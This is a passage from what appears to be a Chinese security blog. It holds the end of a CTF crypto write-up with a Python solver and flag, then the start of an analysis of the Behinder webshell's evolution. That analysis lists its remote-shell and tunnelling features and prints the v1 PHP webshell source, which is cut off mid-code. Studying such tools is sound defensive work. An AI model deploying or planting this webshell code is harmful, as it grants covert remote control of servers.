class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import math</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># primes = []</span></span><br><span class="line"><span class="comment"># for i in range(58769, 2 ** 16):</span></span><br><span class="line"><span class="comment">#     primes.append(i)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for i in range(58769, 2 ** 16):</span></span><br><span class="line"><span class="comment">#     j = 2</span></span><br><span class="line"><span class="comment">#     jud = 1</span></span><br><span class="line"><span class="comment">#     for j in range(2, round(math.sqrt(i)) + 1):</span></span><br><span class="line"><span class="comment">#         if i % j != 0:</span></span><br><span class="line"><span class="comment">#             j = j + 1</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             jud = 0</span></span><br><span class="line"><span class="comment">#     if jud == 0:</span></span><br><span class="line"><span class="comment">#         primes.remove(i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findFactor</span>(<span class="params">before, after, p</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (before + p * i) % after != <span class="number">0</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (before + p * i) / after</span><br><span class="line"></span><br><span class="line">grass = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        grass.append(<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span> + line.split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>].split()[<span class="number">0</span>].decode(), <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(grass))</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">58771</span>, <span class="number">58787</span>, <span class="number">58789</span>, <span class="number">58831</span>,</span><br><span class="line">          <span class="number">58889</span>, <span class="number">58897</span>, <span class="number">58901</span>, <span class="number">58907</span>, <span class="number">58909</span>, <span class="number">58913</span>, <span class="number">58921</span>, <span class="number">58937</span>, <span class="number">58943</span>, <span class="number">58963</span>, <span class="number">58967</span>, <span class="number">58979</span>, <span class="number">58991</span>, <span class="number">58997</span>, <span class="number">59009</span>,</span><br><span class="line">          <span class="number">59011</span>, <span class="number">59021</span>, <span class="number">59023</span>, <span class="number">59029</span>, <span class="number">59051</span>, <span class="number">59053</span>, <span class="number">59063</span>, <span class="number">59069</span>, <span class="number">59077</span>, <span class="number">59083</span>, <span class="number">59093</span>, <span class="number">59107</span>, <span class="number">59113</span>, <span class="number">59119</span>, <span class="number">59123</span>,</span><br><span class="line">          <span class="number">59141</span>, <span class="number">59149</span>, <span class="number">59159</span>, <span class="number">59167</span>, <span class="number">59183</span>, <span class="number">59197</span>, <span class="number">59207</span>, <span class="number">59209</span>, <span class="number">59219</span>, <span class="number">59221</span>, <span class="number">59233</span>, <span class="number">59239</span>, <span class="number">59243</span>, <span class="number">59263</span>, <span class="number">59273</span>,</span><br><span class="line">          <span class="number">59281</span>, <span class="number">59333</span>, <span class="number">59341</span>, <span class="number">59351</span>, <span class="number">59357</span>, <span class="number">59359</span>, <span class="number">59369</span>, <span class="number">59377</span>, <span class="number">59387</span>, <span class="number">59393</span>, <span class="number">59399</span>, <span class="number">59407</span>, <span class="number">59417</span>, <span class="number">59419</span>, <span class="number">59441</span>,</span><br><span class="line">          <span class="number">59443</span>, <span class="number">59447</span>, <span class="number">59453</span>, <span class="number">59467</span>, <span class="number">59471</span>, <span class="number">59473</span>, <span class="number">59497</span>, <span class="number">59509</span>, <span class="number">59513</span>, <span class="number">59539</span>, <span class="number">59557</span>, <span class="number">59561</span>, <span class="number">59567</span>, <span class="number">59581</span>, <span class="number">59611</span>,</span><br><span class="line">          <span class="number">59617</span>, <span class="number">59621</span>, <span class="number">59627</span>, <span class="number">59629</span>, <span class="number">59651</span>, <span class="number">59659</span>, <span class="number">59663</span>, <span class="number">59669</span>, <span class="number">59671</span>, <span class="number">59693</span>, <span class="number">59699</span>, <span class="number">59707</span>, <span class="number">59723</span>, <span class="number">59729</span>, <span class="number">59743</span>,</span><br><span class="line">          <span class="number">59747</span>, <span class="number">59753</span>, <span class="number">59771</span>, <span class="number">59779</span>, <span class="number">59791</span>, <span class="number">59797</span>, <span class="number">59809</span>, <span class="number">59833</span>, <span class="number">59863</span>, <span class="number">59879</span>, <span class="number">59887</span>, <span class="number">59921</span>, <span class="number">59929</span>, <span class="number">59951</span>, <span class="number">59957</span>,</span><br><span class="line">          <span class="number">59971</span>, <span class="number">59981</span>, <span class="number">59999</span>, <span class="number">60013</span>, <span class="number">60017</span>, <span class="number">60029</span>, <span class="number">60037</span>, <span class="number">60041</span>, <span class="number">60077</span>, <span class="number">60083</span>, <span class="number">60089</span>, <span class="number">60091</span>, <span class="number">60101</span>, <span class="number">60103</span>, <span class="number">60107</span>,</span><br><span class="line">          <span class="number">60127</span>, <span class="number">60133</span>, <span class="number">60139</span>, <span class="number">60149</span>, <span class="number">60161</span>, <span class="number">60167</span>, <span class="number">60169</span>, <span class="number">60209</span>, <span class="number">60217</span>, <span class="number">60223</span>, <span class="number">60251</span>, <span class="number">60257</span>, <span class="number">60259</span>, <span class="number">60271</span>, <span class="number">60289</span>,</span><br><span class="line">          <span class="number">60293</span>, <span class="number">60317</span>, <span class="number">60331</span>, <span class="number">60337</span>, <span class="number">60343</span>, <span class="number">60353</span>, <span class="number">60373</span>, <span class="number">60383</span>, <span class="number">60397</span>, <span class="number">60413</span>, <span class="number">60427</span>, <span class="number">60443</span>, <span class="number">60449</span>, <span class="number">60457</span>, <span class="number">60493</span>,</span><br><span class="line">          <span class="number">60497</span>, <span class="number">60509</span>, <span class="number">60521</span>, <span class="number">60527</span>, <span class="number">60539</span>, <span class="number">60589</span>, <span class="number">60601</span>, <span class="number">60607</span>, <span class="number">60611</span>, <span class="number">60617</span>, <span class="number">60623</span>, <span class="number">60631</span>, <span class="number">60637</span>, <span class="number">60647</span>, <span class="number">60649</span>,</span><br><span class="line">          <span class="number">60659</span>, <span class="number">60661</span>, <span class="number">60679</span>, <span class="number">60689</span>, <span class="number">60703</span>, <span class="number">60719</span>, <span class="number">60727</span>, <span class="number">60733</span>, <span class="number">60737</span>, <span class="number">60757</span>, <span class="number">60761</span>, <span class="number">60763</span>, <span class="number">60773</span>, <span class="number">60779</span>, <span class="number">60793</span>,</span><br><span class="line">          <span class="number">60811</span>, <span class="number">60821</span>, <span class="number">60859</span>, <span class="number">60869</span>, <span class="number">60887</span>, <span class="number">60889</span>, <span class="number">60899</span>, <span class="number">60901</span>, <span class="number">60913</span>, <span class="number">60917</span>, <span class="number">60919</span>, <span class="number">60923</span>, <span class="number">60937</span>, <span class="number">60943</span>, <span class="number">60953</span>,</span><br><span class="line">          <span class="number">60961</span>, <span class="number">61001</span>, <span class="number">61007</span>, <span class="number">61027</span>, <span class="number">61031</span>, <span class="number">61043</span>, <span class="number">61051</span>, <span class="number">61057</span>, <span class="number">61091</span>, <span class="number">61099</span>, <span class="number">61121</span>, <span class="number">61129</span>, <span class="number">61141</span>, <span class="number">61151</span>, <span class="number">61153</span>,</span><br><span class="line">          <span class="number">61169</span>, <span class="number">61211</span>, <span class="number">61223</span>, <span class="number">61231</span>, <span class="number">61253</span>, <span class="number">61261</span>, <span class="number">61283</span>, <span class="number">61291</span>, <span class="number">61297</span>, <span class="number">61331</span>, <span class="number">61333</span>, <span class="number">61339</span>, <span class="number">61343</span>, <span class="number">61357</span>, <span class="number">61363</span>,</span><br><span class="line">          <span class="number">61379</span>, <span class="number">61381</span>, <span class="number">61403</span>, <span class="number">61409</span>, <span class="number">61417</span>, <span class="number">61441</span>, <span class="number">61463</span>, <span class="number">61469</span>, <span class="number">61471</span>, <span class="number">61483</span>, <span class="number">61487</span>, <span class="number">61493</span>, <span class="number">61507</span>, <span class="number">61511</span>, <span class="number">61519</span>,</span><br><span class="line">          <span class="number">61543</span>, <span class="number">61547</span>, <span class="number">61553</span>, <span class="number">61559</span>, <span class="number">61561</span>, <span class="number">61583</span>, <span class="number">61603</span>, <span class="number">61609</span>, <span class="number">61613</span>, <span class="number">61627</span>, <span class="number">61631</span>, <span class="number">61637</span>, <span class="number">61643</span>, <span class="number">61651</span>, <span class="number">61657</span>,</span><br><span class="line">          <span class="number">61667</span>, <span class="number">61673</span>, <span class="number">61681</span>, <span class="number">61687</span>, <span class="number">61703</span>, <span class="number">61717</span>, <span class="number">61723</span>, <span class="number">61729</span>, <span class="number">61751</span>, <span class="number">61757</span>, <span class="number">61781</span>, <span class="number">61813</span>, <span class="number">61819</span>, <span class="number">61837</span>, <span class="number">61843</span>,</span><br><span class="line">          <span class="number">61861</span>, <span class="number">61871</span>, <span class="number">61879</span>, <span class="number">61909</span>, <span class="number">61927</span>, <span class="number">61933</span>, <span class="number">61949</span>, <span class="number">61961</span>, <span class="number">61967</span>, <span class="number">61979</span>, <span class="number">61981</span>, <span class="number">61987</span>, <span class="number">61991</span>, <span class="number">62003</span>, <span class="number">62011</span>,</span><br><span class="line">          <span class="number">62017</span>, <span class="number">62039</span>, <span class="number">62047</span>, <span class="number">62053</span>, <span class="number">62057</span>, <span class="number">62071</span>, <span class="number">62081</span>, <span class="number">62099</span>, <span class="number">62119</span>, <span class="number">62129</span>, <span class="number">62131</span>, <span class="number">62137</span>, <span class="number">62141</span>, <span class="number">62143</span>, <span class="number">62171</span>,</span><br><span class="line">          <span class="number">62189</span>, <span class="number">62191</span>, <span class="number">62201</span>, <span class="number">62207</span>, <span class="number">62213</span>, <span class="number">62219</span>, <span class="number">62233</span>, <span class="number">62273</span>, <span class="number">62297</span>, <span class="number">62299</span>, <span class="number">62303</span>, <span class="number">62311</span>, <span class="number">62323</span>, <span class="number">62327</span>, <span class="number">62347</span>,</span><br><span class="line">          <span class="number">62351</span>, <span class="number">62383</span>, <span class="number">62401</span>, <span class="number">62417</span>, <span class="number">62423</span>, <span class="number">62459</span>, <span class="number">62467</span>, <span class="number">62473</span>, <span class="number">62477</span>, <span class="number">62483</span>, <span class="number">62497</span>, <span class="number">62501</span>, <span class="number">62507</span>, <span class="number">62533</span>, <span class="number">62539</span>,</span><br><span class="line">          <span class="number">62549</span>, <span class="number">62563</span>, <span class="number">62581</span>, <span class="number">62591</span>, <span class="number">62597</span>, <span class="number">62603</span>, <span class="number">62617</span>, <span class="number">62627</span>, <span class="number">62633</span>, <span class="number">62639</span>, <span class="number">62653</span>, <span class="number">62659</span>, <span class="number">62683</span>, <span class="number">62687</span>, <span class="number">62701</span>,</span><br><span class="line">          <span class="number">62723</span>, <span class="number">62731</span>, <span class="number">62743</span>, <span class="number">62753</span>, <span class="number">62761</span>, <span class="number">62773</span>, <span class="number">62791</span>, <span class="number">62801</span>, <span class="number">62819</span>, <span class="number">62827</span>, <span class="number">62851</span>, <span class="number">62861</span>, <span class="number">62869</span>, <span class="number">62873</span>, <span class="number">62897</span>,</span><br><span class="line">          <span class="number">62903</span>, <span class="number">62921</span>, <span class="number">62927</span>, <span class="number">62929</span>, <span class="number">62939</span>, <span class="number">62969</span>, <span class="number">62971</span>, <span class="number">62981</span>, <span class="number">62983</span>, <span class="number">62987</span>, <span class="number">62989</span>, <span class="number">63029</span>, <span class="number">63031</span>, <span class="number">63059</span>, <span class="number">63067</span>,</span><br><span class="line">          <span class="number">63073</span>, <span class="number">63079</span>, <span class="number">63097</span>, <span class="number">63103</span>, <span class="number">63113</span>, <span class="number">63127</span>, <span class="number">63131</span>, <span class="number">63149</span>, <span class="number">63179</span>, <span class="number">63197</span>, <span class="number">63199</span>, <span class="number">63211</span>, <span class="number">63241</span>, <span class="number">63247</span>, <span class="number">63277</span>,</span><br><span class="line">          <span class="number">63281</span>, <span class="number">63299</span>, <span class="number">63311</span>, <span class="number">63313</span>, <span class="number">63317</span>, <span class="number">63331</span>, <span class="number">63337</span>, <span class="number">63347</span>, <span class="number">63353</span>, <span class="number">63361</span>, <span class="number">63367</span>, <span class="number">63377</span>, <span class="number">63389</span>, <span class="number">63391</span>, <span class="number">63397</span>,</span><br><span class="line">          <span class="number">63409</span>, <span class="number">63419</span>, <span class="number">63421</span>, <span class="number">63439</span>, <span class="number">63443</span>, <span class="number">63463</span>, <span class="number">63467</span>, <span class="number">63473</span>, <span class="number">63487</span>, <span class="number">63493</span>, <span class="number">63499</span>, <span class="number">63521</span>, <span class="number">63527</span>, <span class="number">63533</span>, <span class="number">63541</span>,</span><br><span class="line">          <span class="number">63559</span>, <span class="number">63577</span>, <span class="number">63587</span>, <span class="number">63589</span>, <span class="number">63599</span>, <span class="number">63601</span>, <span class="number">63607</span>, <span class="number">63611</span>, <span class="number">63617</span>, <span class="number">63629</span>, <span class="number">63647</span>, <span class="number">63649</span>, <span class="number">63659</span>, <span class="number">63667</span>, <span class="number">63671</span>,</span><br><span class="line">          <span class="number">63689</span>, <span class="number">63691</span>, <span class="number">63697</span>, <span class="number">63703</span>, <span class="number">63709</span>, <span class="number">63719</span>, <span class="number">63727</span>, <span class="number">63737</span>, <span class="number">63743</span>, <span class="number">63761</span>, <span class="number">63773</span>, <span class="number">63781</span>, <span class="number">63793</span>, <span class="number">63799</span>, <span class="number">63803</span>,</span><br><span class="line">          <span class="number">63809</span>, <span class="number">63823</span>, <span class="number">63839</span>, <span class="number">63841</span>, <span class="number">63853</span>, <span class="number">63857</span>, <span class="number">63863</span>, <span class="number">63901</span>, <span class="number">63907</span>, <span class="number">63913</span>, <span class="number">63929</span>, <span class="number">63949</span>, <span class="number">63977</span>, <span class="number">63997</span>, <span class="number">64007</span>,</span><br><span class="line">          <span class="number">64013</span>, <span class="number">64019</span>, <span class="number">64033</span>, <span class="number">64037</span>, <span class="number">64063</span>, <span class="number">64067</span>, <span class="number">64081</span>, <span class="number">64091</span>, <span class="number">64109</span>, <span class="number">64123</span>, <span class="number">64151</span>, <span class="number">64153</span>, <span class="number">64157</span>, <span class="number">64171</span>, <span class="number">64187</span>,</span><br><span class="line">          <span class="number">64189</span>, <span class="number">64217</span>, <span class="number">64223</span>, <span class="number">64231</span>, <span class="number">64237</span>, <span class="number">64271</span>, <span class="number">64279</span>, <span class="number">64283</span>, <span class="number">64301</span>, <span class="number">64303</span>, <span class="number">64319</span>, <span class="number">64327</span>, <span class="number">64333</span>, <span class="number">64373</span>, <span class="number">64381</span>,</span><br><span class="line">          <span class="number">64399</span>, <span class="number">64403</span>, <span class="number">64433</span>, <span class="number">64439</span>, <span class="number">64451</span>, <span class="number">64453</span>, <span class="number">64483</span>, <span class="number">64489</span>, <span class="number">64499</span>, <span class="number">64513</span>, <span class="number">64553</span>, <span class="number">64567</span>, <span class="number">64577</span>, <span class="number">64579</span>, <span class="number">64591</span>,</span><br><span class="line">          <span class="number">64601</span>, <span class="number">64609</span>, <span class="number">64613</span>, <span class="number">64621</span>, <span class="number">64627</span>, <span class="number">64633</span>, <span class="number">64661</span>, <span class="number">64663</span>, <span class="number">64667</span>, <span class="number">64679</span>, <span class="number">64693</span>, <span class="number">64709</span>, <span class="number">64717</span>, <span class="number">64747</span>, <span class="number">64763</span>,</span><br><span class="line">          <span class="number">64781</span>, <span class="number">64783</span>, <span class="number">64793</span>, <span class="number">64811</span>, <span class="number">64817</span>, <span class="number">64849</span>, <span class="number">64853</span>, <span class="number">64871</span>, <span class="number">64877</span>, <span class="number">64879</span>, <span class="number">64891</span>, <span class="number">64901</span>, <span class="number">64919</span>, <span class="number">64921</span>, <span class="number">64927</span>,</span><br><span class="line">          <span class="number">64937</span>, <span class="number">64951</span>, <span class="number">64969</span>, <span class="number">64997</span>, <span class="number">65003</span>, <span class="number">65011</span>, <span class="number">65027</span>, <span class="number">65029</span>, <span class="number">65033</span>, <span class="number">65053</span>, <span class="number">65063</span>, <span class="number">65071</span>, <span class="number">65089</span>, <span class="number">65099</span>, <span class="number">65101</span>,</span><br><span class="line">          <span class="number">65111</span>, <span class="number">65119</span>, <span class="number">65123</span>, <span class="number">65129</span>, <span class="number">65141</span>, <span class="number">65147</span>, <span class="number">65167</span>, <span class="number">65171</span>, <span class="number">65173</span>, <span class="number">65179</span>, <span class="number">65183</span>, <span class="number">65203</span>, <span class="number">65213</span>, <span class="number">65239</span>, <span class="number">65257</span>,</span><br><span class="line">          <span class="number">65267</span>, <span class="number">65269</span>, <span class="number">65287</span>, <span class="number">65293</span>, <span class="number">65309</span>, <span class="number">65323</span>, <span class="number">65327</span>, <span class="number">65353</span>, <span class="number">65357</span>, <span class="number">65371</span>, <span class="number">65381</span>, <span class="number">65393</span>, <span class="number">65407</span>, <span class="number">65413</span>, <span class="number">65419</span>,</span><br><span class="line">          <span class="number">65423</span>, <span class="number">65437</span>, <span class="number">65447</span>, <span class="number">65449</span>, <span class="number">65479</span>, <span class="number">65497</span>, <span class="number">65519</span>, <span class="number">65521</span>]</span><br><span class="line"><span class="comment"># p = 59441</span></span><br><span class="line"><span class="comment"># primes=[59441]</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">    k_box = []</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        line = [<span class="number">0</span>] * <span class="number">5</span></span><br><span class="line">        line[<span class="number">4</span>] = grass[i]</span><br><span class="line">        k_box.append(line)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">        k_box[i + <span class="number">1</span>][<span class="number">3</span>] = (findFactor(k_box[i + <span class="number">1</span>][<span class="number">4</span>], k_box[i][<span class="number">4</span>], p))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        k_box[i + <span class="number">2</span>][<span class="number">2</span>] = (findFactor(k_box[i + <span class="number">2</span>][<span class="number">3</span>], k_box[i + <span class="number">1</span>][<span class="number">3</span>], p))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">        k_box[i + <span class="number">3</span>][<span class="number">1</span>] = (findFactor(k_box[i + <span class="number">3</span>][<span class="number">2</span>], k_box[i + <span class="number">2</span>][<span class="number">2</span>], p))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">        k_box[i + <span class="number">4</span>][<span class="number">0</span>] = (findFactor(k_box[i + <span class="number">4</span>][<span class="number">1</span>], k_box[i + <span class="number">3</span>][<span class="number">1</span>], p))</span><br><span class="line">    <span class="comment"># for line in k_box:</span></span><br><span class="line">    <span class="comment">#     print(line)</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">41</span>):</span><br><span class="line">        res.append(<span class="built_in">int</span>(findFactor(k_box[i + <span class="number">1</span>][<span class="number">0</span>], k_box[i][<span class="number">0</span>], p)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(res) &lt; <span class="number">255</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>(res))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>最后解出来<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fsk_TPt_bmxNh3MWphM-kHdqhz7G.png" alt="" />
然后再拼上 flag{，最后为<code>flag&#123;749d39d4-78db-4c55-b4ff-bca873d0f18e&#125;</code></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/08/23/%E5%86%B0%E8%9D%8E%E6%BC%94%E5%8C%96%E5%8F%B2%E2%80%94%E2%80%94%E4%BB%A5php%E9%A9%AC%E4%B8%BA%E4%BE%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="c4ooc0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="c4ooc0个人博客">
      <meta itemprop="description" content="永怀谦卑与求知欲">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | c4ooc0个人博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/08/23/%E5%86%B0%E8%9D%8E%E6%BC%94%E5%8C%96%E5%8F%B2%E2%80%94%E2%80%94%E4%BB%A5php%E9%A9%AC%E4%B8%BA%E4%BE%8B/" class="post-title-link" itemprop="url">冰蝎演化史——以php马为例</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-08-23 16:07:53" itemprop="dateCreated datePublished" datetime="2022-08-23T16:07:53+08:00">2022-08-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-11-10 16:10:16" itemprop="dateModified" datetime="2022-11-10T16:10:16+08:00">2022-11-10</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>3.3k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>12 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>冰蝎，著名的加密流量 webshell 管理工具，刚好前几天冰蝎出 4.0 版啦，谨以此文简单回顾一下这些年冰蝎功能进化与密钥交换方面的变化。功能是一个工具非常重要的部分，密钥交换体现了冰蝎马连接方式上的变化，小聊一下这两个个人认为比较重要的方面。
本文主要关注 PHP 马，PHP 马传输的 payload 解开直接就是明文源码，比 JSP、ASP 好分析一些。因为 PHP 并不存在手动编译的过程，只要提供 PHP 源代码，然后 PHP 会自己把源代码编译为 opcode，由 Zend 引擎来解析 opcode。而冰蝎对于 java <a target="_blank" rel="noopener" href="http://xn--0tr.NET">和.NET</a> 的支持都是传输加密之后的二进制字节流，java 环境传输 class 二进制文件，.NET 环境传输 dll 文件的二进制字节流，想要看到 payload 源码，还需反编译过程，稍微复杂一些。</p>
<h1 id="功能改进"><a class="markdownIt-Anchor" href="#功能改进"></a> 功能改进</h1>
<p>作为工具的使用者，最关注的还是冰蝎功能的提升。而一个基本的 webshell 管理工具，以经典的菜刀为例，需要具有获取基本信息、命令执行、文件管理等基础功能，还有数据库管理、执行脚本等拓展功能。
而脍炙人口的冰蝎当然不会止步于此，从冰蝎 1 开始，作者根据其丰富经验，就内置了九大功能：获取基本信息、文件管理、命令执行、虚拟终端、Socks 代理、反弹 Shell、数据库可视化管理、自定义代码执行和备忘录功能。其中除了 webshell 管理工具的常规功能外，针对内网环境，冰蝎 1 就可以做到自动上传并加载数据库驱动、反弹 Meterpreter、基于一句话木马的 Socks 代理功能等强大功能。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fo5xa_1EkDEvf5BkqF_XyIzXmJTp.png" alt="" />
从反编译的源码来看，冰蝎 2 时作者已有内置插件的想法，但还没完善。除此之外，冰蝎从 2.0 版本开始还有一些细节方面的改善，开始支持自定义请求头、自定义 cookie、http 代理，虚拟终端 shell 进程可关闭等，从渗透角度绝对是更隐蔽了。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fu_dvr9ywJ3NuZ2w7-D1OCZ_KxOB.png" alt="" />
不久后推出的冰蝎 3 就拥有了插件扩展，ui 里可以看到支持在线安装，请求了一下发现返回是 null，可能当时不同功能的插件还有待开发吧。冰蝎 3 能够在 github 上找到的 release 都是 beta 版，界面中所提到 v3 正式版上线的“平行空间”功能都没有实现。不过冰蝎 3 多了 socks 代理连接、增强了内网穿透功能、在原有的基于 HTTP 的 socks5 隧道基础上，增加了单端口转发功能，可一键将内网端口映射至 VPS 或者本机端口、请求体增加了随机冗余参数、提升了客户端运行环境的兼容性、增加内存马防检测功能、Java 内存马注入功能、增加 CobaltStrike 一键上线、增强 shell 管理等等。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiLXrLR9sTIfGp1cHK-CY6Zw6uh_.png" alt="" />
冰蝎 4 实现了“平行空间”功能，也就是内网资产探测和管理，本地环境简单尝试了一下，发现这个功能提升空间还是很大的。其他细节方面，冰蝎 4 增强了文件管理、连接逻辑重构、新增 Agent 内存马一键注入、多层网络子 Shell 穿透模块、自动缓存数据等功能。最重要的是，开放插件开发模块，可由使用者自己开发自定义插件，内置了多款插件，冰蝎生命力更进一步。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FtmAHvEaf6cABdMUsSnAXfXITZS-.png" alt="" /></p>
<h1 id="密钥交换"><a class="markdownIt-Anchor" href="#密钥交换"></a> 密钥交换</h1>
<h2 id="冰蝎-1-一次-get协商密钥"><a class="markdownIt-Anchor" href="#冰蝎-1-一次-get协商密钥"></a> 冰蝎 1 一次 GET，协商密钥</h2>
<p>首先分析一下冰蝎 PHP 马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$key</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">rand</span>())),<span class="number">16</span>);</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="keyword">print</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$key</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">			<span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">	<span 